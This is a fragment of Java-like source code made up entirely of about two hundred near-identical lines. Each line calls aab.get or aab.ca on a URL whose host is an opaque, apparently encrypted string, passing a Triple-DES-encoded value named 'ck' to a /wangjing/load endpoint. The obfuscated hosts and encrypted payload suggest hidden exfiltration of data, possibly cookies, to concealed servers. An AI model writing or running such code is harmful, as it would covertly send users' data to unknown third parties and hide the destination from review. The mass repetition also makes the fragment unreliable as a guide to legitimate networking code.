                                    aab.get("http://xq88WW3nFp80CvaRWrtIjA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://vBt8oOGIffYS3tlJPSAkRg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://RQ8++geAxe17LBMNKz1rkw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://ples28i7WYxJYaEZKYFkbw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://49vg+ZoVW6UfI8HRlrZ4MA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://5nSwMKzmKqWmStBTfSt1+g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://41k/TgrhIjrnhqNFbU63ZQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://zDilIVfp3lFJM31sJ/hJqQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://knGxaDCvhpgopfz3G8hq9w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://fNQtRIh80TpiQeIMuyeVYg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://pquQ+N7PivyCDeZ2gWR3Kw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://N/Z+BQ+xQoI33VL8CDbu3w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://V+xDTIGwrOS+eqMrKrKYfw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://ToZ4VVB9rxYDKoM7gBdFfg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://0UhLF79yMitCrOkYiKa0lA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://b9V4R1Rt3kH90A0FnA6drw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://xPpiu81uKCqr6IH44MX7Bw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://OYcHGBZTwymyirfOzeM6DA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://jVC0EoNNoy0M3E+o/zjR1Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://lfgmNW7pdxJcAPlzytNSPg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://mXgcuzTNsUJ1uv9/1pcMcw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://zYrHk9O/Pnw4vy/1QkUiQg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://jHomj3oHfAjzjOR33dBigw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://6qpGWI4nhdHKO9D+CuRehQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://e/46EDshq1OllYz6q0rYew==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://RRdOLfFfu1e0FwKtwQYsvQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://CTYV/oEUw2YnhgMWSYDRFw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://8RGV4CYBbWUAoqIZmCenPg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://NFjlTIXNHetBFQXMKVjHWA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://GP3BdudXPTEyqKjkwuzHmw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://msFnqW9Tv5pmB1wrxs+qkA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://F4CUIiaKflS0PIrpTxAijg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://5xwzht8kDhk2jhmNX1LdVg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://famohnbSKen9jb5LWoHLdQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http:///rshALxooBDZWdMqUtGYuQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://cjoZpjVHvrSi7RvIKdoeEA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://qHtCbmUR7+w5QXCdHdcYIw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://hmjj3ojM5LXQTSYtWtsRAg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://wIwEqZU5xtbav5B9h0hJsg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://tutJcX2OAD1zNk5OG6iB9g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://ZokavBADGQbPTak4jt6CeQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://nnvnz5JuSdVL5Xwg8EjWNQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://ZWWmdKPxpGrSWLGkfoAmjw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://frtGKlAqSPNANPOCD+oCJg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://k845fDJHXhv8RrT8jwwoeQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://GmwOvsm7nCDTTNBtB9+qGg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Xa0Iyqb+YWkbXOT8rjjNIw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Ym6ab/qiP84GYFUWiKKDSg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://hpHNchRYsJFHFPSFQCh4lw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://dTBpJS4RIdg5l3cKQDX6fA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://abQGtIiRgZ8gRygCApea7A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://5waXgZH2o5grNw36ylBSLA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://94VxJX49p2mkzfOiXDFkKQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Y8T0ixmgH7zpjpTaEuzmMw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Eapl0AhMiIRlWYJQ0ozOrg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://1FMgXG9vAYXZLyB4hHvbZg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://MV0TiQQqIuVRHeaBiwr7sQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://kJMU6JRTaWFCJASER2QQWQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://cMtc35NqpD2PuM9Bf0l3Dw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://cJsS6ctt7+mTGk0CnpTGxA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://548uQRHil3VCyJcpwVBDWg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://laYUFr8rqcAtf/tZ1UKZlA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://cFGAsCchdDPgyK8tddbE4w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://q7cUQO8LZTOSn2TP4dwaNA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://ZcrhMbMU8kwgFU/LvlY0/Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Gy7m7LvPGD20vhvW0rhQMQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://kfaIujEB0O/+jzqbvU7AIA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://jZpIbVGbpYqmgti0tDrMnA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://IsKQ15sJc2uakyBcAEAOTw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://yZG3WNqLIV1Jz7ivDVU0kA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://lPamPRJdeT/TCe2sb1Oy2w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://9f6xvPMk3Y1CeHr8tUobZQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://mcE+CL+htq+ryBUsqxzq4g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://hGR+Ec8Xr1xPkzLxD78TCw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://GFELQuMYAz7A2kRabKYvvA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Yhn5eGPb+iNy7Umhdei+8A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://0exbCoVSAl83Nzct83nMog==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Yf6+1lm4CVFxaW/vo19HKw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://YK3fBtJwSaiw9KuQC1Ti5A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://M//FN3SRiBRYEDavW1n1lg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://SMq8EsH9sKRY+lE/cQtAyg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://qmEtZHi8wNACq7fFLvlXDg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://BJPJNjAIJXExD+JAKRQTZg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://ly+8OSqp5InL4q6dlZxZgA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http:///GG2CS+1wePsjAFNGjzY2A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://8t+wQCeWw2aL63kqxTPKaQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://5S++KNRXogRZaAfcyCzPBw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://0VzJ1OeKXhdpp/DtBqn/GA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http:///kk0/kDlBgFuesHAXZn8fA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://SpjusKV9XBSo7PO5IcZy5w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://b/qYFA+NSX78CaihCkEmMw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://RSDtGJBw4UAMsOneh3nPyQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Hsa9TM3iZXSlgnyZkxStIw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Wm0QD299rgrRXH41vGJAxQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Ae4R9wmEXJdDMGYuDAUP6g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://1hlri4NZrbn4RW4wqDSxyg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://0ISQU82yKwHDVjU7SZxzDQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://JOE+v4w1L4d0HcZxPXlHDg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://ncUEleYW5pWVlTHvZj5l9g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://lJC4yzPw0DfDD3LCrEzNgQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://1d+t+S1qgHo14vFOyEsmHg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://5kdkAQoj0INdXW+Rng1I4g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://jFhCXSRRQj2eCedVahb5ag==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://j0ExwmflYHL/4DdkI2FsJw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://XBRqvFlkKI5nCbPQP6WEPw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://tnh5wzK3K2Zp7jhdwL7ESw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://KOSZzgv2R2gM9Reed35UIg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://ZIxkyA77PLIgN3NOgB5p4A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://ihwT3mjzt6uFP/QSkv23oA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://g0uTOZYZ1dL5K0s8BgX6IA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://e5d8bbIVwSWA3hzkneIBaQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://TYYRn9Gpi5tevcrAY6YNkw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://14fmf+esc0anC7jFe+e7Aw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://dySMooE7NBQu4454iNrwkg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Ewz63dczWd67gq0ipXc2WQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://9jEb/udO8BSLAQbasTjo/Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Gz/rVFNil0uRy4JOXd1nUA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://gxIlKbvRpi58cFoHwjvixA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://zHQitbi6iF0DotI2L6jgQQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://ebH2IhipSQU8ZqU6Sk8rJA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Z4SZOU2fpJU/RnvcJiDy7A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://M+jbjG10J5qQAMzC9IqeMQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://5Y8EDJ/23aGyUi7Q6toI5g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://q75OJCHdYyXgTr82fcBSdA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://GB4dsOyNEw7TY2kQOVdTrw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://nFtWCHfwgEwyl9b53G3ZDg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://hBJVTney6GBb6hwN9j8oMw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://UutbeBUIBV3DsNbJspS2mQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://DJEdk9OQri9USSkl02fXFQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://7VMkTcwC8N7u/KHC6oG7qw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://W2jAnGCZgt2/e+lRBcJFNw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://6jmT5cIuFVXMwWFzVspX0Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://vQrZSHql9a9EoHHJpRkraA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Rq3u41slY30vT2rMGyLGZg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Wzi6NRISpKNUJ4HiWd2PKA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://cuXDVfFdwVpybYc98w/eoQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://cVB9n+1Ih4icmQ8n/G02WQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://CQygRJXNVh4Y98kGEJu2Cg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://fatcEov2lgA4tBhaysWDlg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://gIOHHyp6fOoyiX8VBZwDKg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://kaFHC1fhX3616Fk+oWGg0Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://c8uuclEG7UpUiwWDvVQKKw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://VgpvzPzD6qk/lbtOnr//hQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://vq7a/lZIaQpNrSIGBB/Xcw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://G0Ze8dQbnM8i9LiHao7SfA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://G/9hUFr7T6jtr8deKzAtgA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://aA6G7JerrAirW85o2a4tyw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://lXIw6YC8Hc6Kihf2M+pkeA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://G8Yw+VDP2/oaI7MX10h2iw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://m92oXLiTLp1a+8ATqvM8hA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://wEgGm214+hpIQKG1v6Oesg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://VruWL/+VKrOuBqjFrKQGdw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://+1aprFZPftjwerfY4h8btg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://BmBo7yMrN/Q7Geau8IFDLA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://5f3QMngQSSHOhxL0uHcEAA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://u7D8/PuhwMKRpPyAsiQvPQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://ZTBoKu5ehuQV3I1u14idUg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Bpzg2wdvme/e8t/GxkpoQw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://XPNPz3OKEvlefImqSAFZUg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://QMnQ/PKVwW4+7wX/YJ2fxA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Z+z7GB/glzDZIpaxZ/+CEQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://BGI9qmYcQsRiIzDqQ8Cp1A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://FonZF2n4m1Wy5C4hgHiimQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://SyswB13wo7NRUaYr6aGtvg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://7LBa23SZbLync9r5qzJx8w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://gTpIdNylwbZVXyGs4nbhkA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://UNJtl1sN1YlMQr4rnXGXwg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://8yYzRgK1xmUxwjfl9mVdOA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://BELTP52wudtCT1t7OKYpYA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://teXDqyADKntEp3PY52d3yQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://4O3/rIMFcq1jThQgQUWKrQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://L35nEvGm4OPkI2QueO74JA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://4biKK1CZt6o2REKDjL9Uiw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://gucTXrpG4MMnmb5kv4BhcA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://ErB59c5AE0CwDC0+FDWGLQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://SvETcLVCqB2fMa9Z+7C0qA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://N+F2aA2xEa2vOpnGP1DIdw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://KTEKu/hYq4nPrZCN+F6IJg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://ZFUBs9itdU+6Nec9FlQn5w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://kOl4xuq/N5AJTaAYdJ62YA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://V2A73g7UhsoV+B0DVN9Yzg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://7/SW53K5vZzhmxDES+mlqw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http:///hNWdh2/1cc5QpaY6CTz6Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://IMofx1JpW1O0jK16slHbXw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://CagY1kQSF6MnBMzYJAtnHA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://OOqetFxxFopyQmI018j/4A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://XgUKQA0YGTvTlrnTf5NEbA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://FaTFI/pl2HIkpGp/PjPuWA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://tZQubdPyejVWFTji4p8ugg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://5PMl4Lt/IWiX4IePbSNIwQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://gu9DksAaKcIGsAAVuSiFSw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://AaQ3RC0C73w0vLySByia7Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://SXHbx8Zk2dXZQhkA6hfdow==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http:///y+9B+yLoK1MBPDr4dsfrQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://5SJK6Guik19ILUBCg0wD0Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://7QxVUqUmSBKqQ5ajsGSySw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://ly1bHGhwY2jiaz5Es/L0dg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://ZC6SrkxEtl+Msbj02Kn5tw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://3FmqtkUJHbxZPrGcdoqsMQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://QaJSVmuISXu7jr0frLlcUA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://8Ttgfhu7Bv3WLcuFXkuolA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://r0HoMZz7wM4zr8uil33Tdw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://slCq7AMYwyrx8EedY1zlqw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://5Wje6a/CBLziUcBjCVJfcA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://BmPQqbzOpBGBN0vinJ6JzQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://36ouG/MtMIO2RnMu6lco+Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://emBvqEaxVwFLPWNrSvBbdw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://MiizNPgbuCZoZXVcf1Plsw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://x1zCZeY9tciEysH9PIharw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://jVOETbKIGGRpQCNq+lj01w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://FiISpYebotl3A9RxQCEePw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
